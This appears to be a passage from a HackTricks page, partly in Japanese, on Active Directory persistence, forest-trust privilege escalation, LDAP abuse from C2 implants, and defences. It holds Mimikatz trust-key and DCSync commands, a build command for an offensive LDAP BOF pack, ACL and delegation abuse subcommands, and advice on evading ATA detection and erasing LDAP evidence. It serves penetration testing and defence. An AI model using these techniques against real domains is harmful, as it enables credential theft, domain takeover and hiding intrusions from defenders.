Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン trust を列挙する他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2つのtrusted keys** があり、1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のdomainで使用されているものは次のように確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

trustを悪用したSID-History injectionで、child/parent domainからEnterprise adminへescalateします:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) がどのように悪用されるかを理解することは重要です。Configuration NC は Active Directory (AD) 環境全体の configuration data を集約する central repository として機能します。この data は forest 内のすべての Domain Controller (DC) に replicate され、writeable な DC は Configuration NC の writable copy を保持します。これを悪用するには、**DC 上で SYSTEM privileges** が必要で、できれば child DC が望ましいです。

**Link GPO to root DC site**

Configuration NC の Sites container には、AD forest 内の domain-joined computers すべての site に関する情報が含まれています。任意の DC 上で SYSTEM privileges を持って操作することで、攻撃者は GPO を root DC sites に link できます。この操作により、これらの site に適用される policy を操作して root domain を侵害できる可能性があります。

詳細については、[Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) の research を参照できます。

**Compromise any gMSA in the forest**

攻撃ベクトルの1つは、domain 内の特権 gMSA を標的にすることです。gMSA の password 計算に必要な KDS Root key は Configuration NC に保存されています。任意の DC 上で SYSTEM privileges があれば、KDS Root key にアクセスして forest 全体の任意の gMSA の password を計算できます。

詳細な analysis と手順は次で確認できます:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA attack (BadSuccessor – migration attributes の悪用):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この方法には patience が必要で、新しい特権 AD objects の作成を待つ必要があります。SYSTEM privileges があれば、攻撃者は AD Schema を変更して、任意の user にすべての class への完全な control を与えられます。これにより、後から作成される AD objects への unauthorized access と control が可能になるかもしれません。

詳細は [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) を参照してください。

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability は、Public Key Infrastructure (PKI) objects の control を狙い、forest 内の任意の user として authentication できる certificate template を作成します。PKI objects は Configuration NC に存在するため、writable な child DC を侵害すると ESC5 attacks を実行できます。

詳細は [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) を参照してください。ADCS がないシナリオでは、攻撃者は必要な component をセットアップする能力を持ちます。これは [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) で説明されています。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインは信頼されており**、外部ドメインからあなたに対して**未定義の権限**が与えられています。あなたは **あなたのドメインのどの principals が外部ドメインに対してどのアクセス権を持っているか** を見つけ、その後それを悪用する必要があります:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは、**あなたのドメイン**が**別のドメイン**の principal に**権限**を**信頼**しています。

ただし、**ドメインが trusted** されると、trusting domain は**予測可能な名前**の**ユーザー**を**作成**し、**trusted password** を**パスワード**として使います。つまり、**trusting domain** のユーザーからアクセスして **trusted one** に入り込み、列挙して、さらに権限昇格を狙うことが可能です:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を侵害する別の方法は、ドメイン trust の**逆方向**に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

trusted domain を侵害する別の方法は、**trusted domain のユーザーがアクセス可能**なマシンで **RDP** でログインするのを待つことです。すると、攻撃者はその RDP セッションのプロセスにコードを注入し、そこから**被害者の元ドメイン**へアクセスできます。\
さらに、**被害者が自分のハードドライブをマウント**していた場合、**RDP セッション**のプロセスから攻撃者はそのハードドライブの**startup folder** に**バックドア**を保存できます。この手法は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trust をまたぐ SID history 属性を利用した攻撃のリスクは、SID Filtering によって軽減されます。これは、すべての inter-forest trusts でデフォルト有効です。これは、Microsoft の見解に従い、domain ではなく forest をセキュリティ境界とみなす前提に基づいています。
- ただし注意点があります。SID filtering は application や user access を妨害し、結果として無効化されることがあります。

### **Selective Authentication:**

- inter-forest trusts では、Selective Authentication を使うことで、2 つの forest の users が自動的に authenticated されないようにできます。代わりに、users が trusting domain または forest 内の domains と servers にアクセスするには、明示的な permissions が必要です。
- 重要なのは、これらの対策は writable な Configuration Naming Context (NC) の悪用や trust account への攻撃を防がない、という点です。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host Implants からの LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD スタイルの LDAP primitives を x64 Beacon Object Files として再実装したもので、on-host implant（例: Adaptix C2）内で完全に動作します。オペレーターは `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` で pack をコンパイルし、`ldap.axs` を読み込み、その後 beacon から `ldap <subcommand>` を呼び出します。すべての traffic は現在の logon security context 上で LDAP (389) の signing/sealing、または LDAPS (636) の auto certificate trust を使って流れるため、socks proxies や disk artifacts は不要です。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, `get-groupmembers` は、短い名前/OU パスを完全な DN に解決し、対応する objects をダンプします。
- `get-object`, `get-attribute`, `get-domaininfo` は、任意の attributes（security descriptors を含む）と `rootDSE` からの forest/domain metadata を取得します。
- `get-uac`, `get-spn`, `get-delegation`, `get-rbcd` は、roasting candidates、delegation settings、既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors を LDAP から直接公開します。
- `get-acl` と `get-writable --detailed` は DACL を解析し、trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）、および inheritance を列挙して、ACL privilege escalation の即時ターゲットを示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 昇格と永続化のための LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) により、OU 権限がある場所ならどこでも、operator は新しい principals や machine accounts を配置できる。`add-groupmember`, `set-password`, `add-attribute`, `set-attribute` は、write-property 権限が見つかった時点で target を直接 hijack する。
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync` のような ACL-focused commands は、任意の AD object に対する WriteDACL/WriteOwner を、PowerShell/ADSI artifacts を残さずに、password resets、group membership control、DCSync replication privileges に変換する。`remove-*` の対応コマンドは注入された ACEs をクリーンアップする。

### Delegation、roasting、Kerberos abuse

- `add-spn`/`set-spn` は、compromised user を即座に Kerberoastable にする。`add-asreproastable` (UAC toggle) は、password に触れずに AS-REP roasting の対象としてマークする。
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) は、beacon から `msDS-AllowedToDelegateTo`、UAC flags、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD attack paths を有効化し、remote PowerShell や RSAT を不要にする。

### sidHistory injection、OU relocation、attack surface shaping

- `add-sidhistory` は、制御下の principal の SID history に特権 SID を注入する（[SID-History Injection](sid-history-injection.md) を参照）。これにより、LDAP/LDAPS のみで stealthy に access inheritance を得られる。
- `move-object` は、computers や users の DN/OU を変更し、attackers が assets を、委任済み権限がすでに存在する OUs に移してから `set-password`, `add-groupmember`, `add-spn` を悪用できるようにする。
- 厳密にスコープされた removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, など) により、operator が credentials や persistence を取得した後に迅速な rollback が可能になり、telemetry を最小化できる。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御

[**credentials を保護する方法の詳細はこちら。**](../stealing-credentials/credentials-protections.md)

### **credentials 保護のための防御策**

- **Domain Admins の制限**: Domain Admins は Domain Controllers にのみ login できるようにし、他の hosts では使わないことが推奨される。
- **Service Account の権限**: security を維持するため、Services を Domain Admin (DA) privileges で実行しない。
- **Temporal Privilege Limitation**: DA privileges を必要とする tasks では、その継続時間を制限する。これは次のように実現できる: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 を監査し、その後 DCs/clients で LDAP signing と LDAPS channel binding を強制して、LDAP MITM/relay attempts をブロックする。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity の protocol-level fingerprinting

一般的な AD tradecraft を検知したいなら、リネームされた binaries、service names、temp batch files、output paths のような、operator が制御する artifacts だけに **依存しない** こと。正規の Windows clients が [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI traffic をどう構築するかを baseline 化し、そのうえで、operator が `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, `ntlmrelayx.py` を編集した後でも残る **implementation quirks** を探す。

- **High-confidence standalone candidates**（自分の baseline で検証した後）:
- `auth_context_id = 79231 + ctx_id` を使う authenticated DCE/RPC
- `0xff` で埋められた DCE/RPC authentication padding
- raw Kerberos `AP-REQ` を SPNEGO `mechToken` に直接入れる LDAP Kerberos binds
- ASCII のように見える `ClientGuid` 値を持つ SMB2/3 negotiate requests
- 非標準 namespace `//./root/cimv2` を使う WMI `IWbemLevel1Login::NTLMLogin`
- ハードコードされた Kerberos nonce values
- **correlation/scoring features として使う方がよいもの**:
- 疎、または重複した Kerberos etype lists、異常または欠落した `PA-DATA`、あるいは native Windows と異なる TGS-REQ etype ordering
- version info がない NTLM Type 1 messages、または null host names を持つ Type 3 messages
- SPNEGO ではなく DCE/RPC に載せられた raw NTLMSSP、欠落した DCE/RPC verification trailers、または SPNEGO/Kerberos OID の不一致
- 同じ host/user/session/time window から出るこれら複数の特徴は、単一の弱い field よりはるかに強い
- **standalone alerts ではなく enrichment として使う**:
- デフォルト filenames、output paths、random service names、temporary batch names、default computer account names、tool-specific HTTP/WebDAV/RDP/MSSQL strings
- これらは operator によって簡単に変更できるため、cross-protocol cluster が suspicious である理由を説明する用途に最適
- **Operational notes**:
- これらの signal の一部は、decrypted traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、または service-side visibility を必要とする
- alerts に昇格する前に、Samba/Linux clients、appliances、legacy software と照合して検証する
- baseline に対する信頼が高まるにつれて、detections を enrichment -> hunting -> alerting の順で昇格させる

### **Deception Techniques の実装**

- deception の実装は、decoy users や computers のような traps を仕掛けることを含み、passwords that do not expire や Trusted for Delegation としてマークされる、といった feature を持たせる。詳細なアプローチには、特定の rights を持つ users を作成する、または high privilege groups に追加することが含まれる。
- 実践例としては、次のような tools を使う: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- deception techniques の展開についてさらに知るには、[Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照。

### **Deception の識別**

- **User Objects に対して**: suspicious indicators には atypical ObjectSID、まれな logons、creation dates、低い bad password counts が含まれる。
- **General Indicators**: 候補となる decoy objects の attributes を本物のものと比較すると、不一致が見つかることがある。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) のような tools は、このような deception の特定に役立つ。

### **Detection Systems のバイパス**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection を防ぐため、Domain Controllers 上で session enumeration を避ける。
- **Ticket Impersonation**: ticket creation に **aes** keys を使うと、NTLM への downgrade を回避できるため detection を回避しやすい。
- **DCSync Attacks**: Domain Controller から直接実行すると alerts が発生するため、ATA detection を避けるには non-Domain Controller から実行することが推奨される。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
